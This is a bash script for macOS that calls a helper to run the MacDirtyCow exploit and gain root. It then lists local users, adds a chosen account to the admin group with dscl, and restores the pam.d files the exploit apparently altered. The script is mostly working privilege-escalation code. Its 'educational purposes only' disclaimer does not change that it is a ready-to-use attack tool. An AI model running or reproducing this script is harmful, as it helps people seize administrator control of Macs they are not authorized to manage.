#!/bin/bash

# This script will use the MacDirtyCow exploit to gain root access on a Mac,
# then it will convert a user account to an admin account.
# 
# This script is for educational purposes only. I am not responsible for any
# damage caused by this script.

cd $(dirname $0)

# Check compatibility
compat=$(./helpers/compat.command)
if [ $compat -eq 0 ]; then
    echo "Sorry, your macOS version ($(sw_vers -productVersion)) is not compatible with this program."
    echo "Check the README.md to see supported versions."
    exit 1
fi

# Run exploit
./helpers/exploit.command

# Ask for username to give admin access
echo ""
echo "All users:"
for username in $(ls /Users | grep -v "Shared"); do
    echo " - $username"
done
echo "Enter username to give admin access:"
read -p "[$USER] " username
if [ -z "$username" ]; then
    username=$USER
fi

# Give admin access to user
su - root -c "dscl . -append /groups/admin GroupMembership $username"
echo "Successfully gave $username admin access"

# Revert pam.d files to original
sudo ./helpers/reset_pam.command